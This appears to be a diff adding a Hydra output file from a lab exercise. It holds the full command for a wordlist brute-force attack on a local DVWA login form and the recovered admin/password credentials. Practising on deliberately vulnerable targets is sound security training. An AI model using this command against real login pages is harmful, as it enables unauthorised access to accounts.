@@ -1,0 +1,2 @@
+# Hydra v9.5 run at 2025-09-28 20:54:50 on 127.0.0.1 http-post-form (hydra -L usuarios.txt -P claves.txt -f -o found.txt -V 127.0.0.1 http-post-form /DVWA/login.php:username=^USER^&password=^PASS^&Login=Login&user_token=^TOKEN^:F=Login failed)
+[80][http-post-form] host: 127.0.0.1   login: admin   password: password
